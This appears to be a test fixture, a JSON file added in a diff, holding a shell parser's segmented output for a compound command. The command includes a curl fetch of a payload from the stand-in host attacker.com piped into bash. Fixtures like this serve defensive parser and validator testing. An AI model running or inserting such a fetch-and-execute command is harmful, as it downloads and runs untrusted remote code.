@@ -1,0 +1,56 @@
+[
+  {
+    "argv": [
+      "curl",
+      "-s",
+      "https://api.target.com/ping"
+    ],
+    "original": [
+      "curl",
+      "-s",
+      "https://api.target.com/ping"
+    ],
+    "terminator": "ANDAND",
+    "depth": 0,
+    "origin": "top"
+  },
+  {
+    "argv": [
+      "curl",
+      "-fsSL",
+      "https://attacker.com/payload.sh"
+    ],
+    "original": [
+      "curl",
+      "-fsSL",
+      "https://attacker.com/payload.sh"
+    ],
+    "terminator": "PIPE",
+    "depth": 0,
+    "origin": "top"
+  },
+  {
+    "argv": [
+      "bash"
+    ],
+    "original": [
+      "bash"
+    ],
+    "terminator": "OROR",
+    "depth": 0,
+    "origin": "top"
+  },
+  {
+    "argv": [
+      "echo",
+      "failed"
+    ],
+    "original": [
+      "echo",
+      "failed"
+    ],
+    "terminator": "NEWLINE",
+    "depth": 0,
+    "origin": "top"
+  }
+]
